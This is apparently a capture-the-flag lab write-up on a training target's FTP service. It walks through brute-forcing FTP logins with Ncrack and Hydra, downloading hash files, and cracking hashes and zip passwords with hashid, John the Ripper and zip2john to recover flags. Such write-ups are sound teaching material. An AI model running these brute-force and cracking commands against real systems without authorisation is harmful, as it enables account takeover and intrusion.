## **FTP Exploration and Flag Discovery:**

**Introduction:**
In this section, we delve into the exploration of the FTP (File Transfer Protocol) service on the target machine. The objective is to identify hidden directories, retrieve hash files, crack them using John the Ripper, and ultimately discover flags concealed within.

**Preparing Dictionary Files:**

To initiate the password cracking process, I created a small dictionary file named **`ncrackdic.txt`** containing potential usernames and passwords.

![Untitled](Untitled%2015.png)

I used Ncrack to bruteforce FTP credentials using the dictionary file created.

```jsx
ncrack -U ncrackdic.txt -P ncrackdic.txt  [ftp://$IP](ftp://$ip/)
```

![Untitled](Untitled%2016.png)

To ensure comprehensive coverage, I utilized Hydra for further bruteforcing attempts, employing the same dictionary file.

```jsx
hydra -L ncrackdic.txt -P ncrackdic.txt [ftp://$IP](ftp://$ip/)
```

![Untitled](Untitled%2017.png)

**Accessing FTP Service:**

With successful credentials, I connected to the FTP service using the command

```jsx
ftp $IP
```

![Untitled](Untitled%2018.png)

**Retrieving Hash Files:**

Upon exploration, I discovered a directory named **`hash_to_crack`** containing hash files. Using wget, I downloaded all hash files from the FTP server.

```jsx
wget -r --ftp-user=ctf --ftp-password=ctf [ftp://$IP/hash_to_crack](ftp://$ip/hash_to_crack) 
```

![Untitled](Untitled%2019.png)

**Hash Analysis and Cracking:**

After downloading the hash files, I navigated to the **`hash_to_crack`** directory and identified the hash formats using the hashid tool.

```jsx
cd $IP/hash_to_crack
```

![Untitled](Untitled%2020.png)

Use Hashid to determine the format of all these hash files.

```jsx
hashid hash1.txt
```

![Untitled](Untitled%2021.png)

Following identification, I proceeded to crack the hashes using John the Ripper, utilizing a wordlist (**`wordlist.txt`**).

hash1 MD5 C0d3_0b5cur3r_Flag

```jsx
john --format=raw-md5 --wordlist=wordlist.txt hash1.txt
```

hash2 SHA-1 C0d3_5l4y3r_Flag

```jsx
john --format=raw-sha1 --wordlist=wordlist.txt hash2.txt
```

hash3 SHA-512 H4ck3r_Flag

```jsx
john --format=raw-sha512 --wordlist=wordlist.txt hash3.txt
```

hash4 SHA-256 L0ck_Flag

```jsx
john --format=raw-sha256 --wordlist=wordlist.txt hash4.txt
```

hash5 MD5 S3cur1ty_Flag

```jsx
john --format=raw-md5 --wordlist=wordlist.txt hash5.txt
```

To ensure accuracy, I used John's **`--show`** command to display all cracked passwords and confirmed the flags obtained from the hashes.

```jsx
john --show --format=raw-md5  hash1.txt &&  john --show --format=raw-sha1 hash2.txt && john --show --format=raw-sha512 hash3.txt && john --show --format=raw-sha256 hash4.txt && john --show --format=raw-md5 hash5.txt
```

**Exploring FTP Anonymously:**

Additionally, I accessed the FTP server anonymously to retrieve further files, including **`flag.txt`** and **`files.zip`**.

![Untitled](Untitled%2023.png)

```jsx
ftp $IP
```

```jsx
get flag.txt
```

```jsx
get files.zip
```

```jsx
cat flag.txt
```

Upon downloading **`flag.txt`**, I opened the file and confirmed the presence of the flag: **`{ftp_server_4_lyfe}`**.

![Untitled](Untitled%2024.png)

**Discovery of Flags within files.zip:**

To access the contents of **`files.zip`**, I first generated a hash of the zip file using the **`zip2john`** tool and saved it to a file named **`ziphash.txt`**.

```jsx
zip2john files.zip > ziphash.txt
```

![Untitled](Untitled%2025.png)

Next, I used John the Ripper to crack the password for **`files.zip`** by providing the generated hash and a wordlist (**`Masterschool_Wordlist.txt`**).

```jsx
john ziphash.txt --wordlist=Masterschool_Wordlist.txt  
```

After successfully cracking the password, I unzipped **`files.zip`** to reveal its contents

```jsx
unzip files.zip 
```

Inside **`files.zip`**, I discovered another archive named **`secret.zip`** along with a **`wordlist.txt`** file.

**Hashing and Cracking secret.zip:**

Similarly, I generated a hash of **`secret.zip`** using **`zip2john`** and saved it to a file named **`secrethash.txt`**.

```jsx
zip2john secret.zip > secrethash.txt
```

Subsequently, I utilized John the Ripper to crack the password for **`secret.zip`** by providing the generated hash and the same wordlist used previously.

```jsx
john secrethash.txt --wordlist=wordlist.txt  
```

![Untitled](Untitled%2026.png)

Upon successful password cracking, I unzipped **`secret.zip`** to reveal its contents

```jsx
unzip secret.zip
```

Inside **`secret.zip`**, I found a file named **`john_flag.txt`**.
Upon examining the contents of **`john_flag.txt`**, I confirmed the presence of the flag: **`{LetMe1n123!@#}`**.
